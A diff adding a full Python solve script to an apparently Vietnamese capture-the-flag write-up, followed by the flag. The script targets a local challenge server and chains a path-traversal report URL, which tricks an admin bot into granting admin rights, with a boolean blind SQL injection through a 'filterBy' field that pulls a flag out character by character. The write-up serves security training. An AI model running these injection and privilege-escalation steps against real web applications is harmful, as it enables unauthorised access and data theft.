@@ -424,6 +424,95 @@ Nếu ký tự khác thì sao ?
 
 Ye quá ngon. Cứ tiếp tục thì ta sẽ tim được full flag
 
+Full solve script:
+
+```python
+import requests
+import secrets
+import re
+import json
+import time
+import string
+
+URL = "http://127.0.0.1:3000/"
+
+session = requests.Session()
+
+rand_id = secrets.token_hex(10)
+username = 'winky' + rand_id
+password = rand_id
+user_id = ""
+
+csrf_token = ""
+def get_csrf_token():
+    r = session.get(URL)
+    m = re.findall(r'name="_csrf"\s+value="([^"]+)"', r.text)
+    global csrf_token
+    csrf_token = m[0]
+
+def register():
+    user = {
+        '_csrf': csrf_token,
+        'username': username,
+        'password': password
+    }
+    r = session.post(URL + 'auth/register', data=user)
+    
+def login():
+    user = {
+        '_csrf': csrf_token,
+        'username': username,
+        'password': password
+    }
+    r = session.post(URL + 'auth/login', data=user)
+    global user_id
+    user_id = str(json.loads(r.text)['id'])
+    
+def report():
+    data = {
+        "_csrf": csrf_token,
+        "url": f"http://localhost:3000/user/profile/?id={user_id}/../../admin/addAdmin"
+    }
+    r = session.post(URL + 'report', data=data)
+    time.sleep(1)
+
+def add_msg():
+    data = {
+        '_csrf': csrf_token,
+        'msg': 'dummy'
+    }
+    r = session.post(URL + 'msg', data=data)
+
+def get_flag():
+    ch = string.ascii_letters + string.digits + '{}_!@$#%^&*()_+=`'
+    flag = ""
+    for i in range(40):
+        found = False
+        for j in ch:
+            data = {
+                '_csrf': csrf_token,
+                'filterBy': f'type" like $1 or (select substring(flag,{i+1},1)=\'{j}\' from flags) -- ',
+                'keyword':'dummy'
+            }
+            r = session.post(URL + 'admin/msgs', data=data)
+            if (username in r.text):
+                flag += j
+                found = True
+                print(f'found char {j} at pos {i+1}, flag is {flag}')
+                break
+        if (not found):
+            break
+    print(flag)
+    
+get_csrf_token()
+register()
+login()
+report()
+login()
+add_msg()
+get_flag()
+```
+
 Flag: `Secuinets{239c12b45ff0ff9fbd477bd9e754ed13}`
 
 # Misc
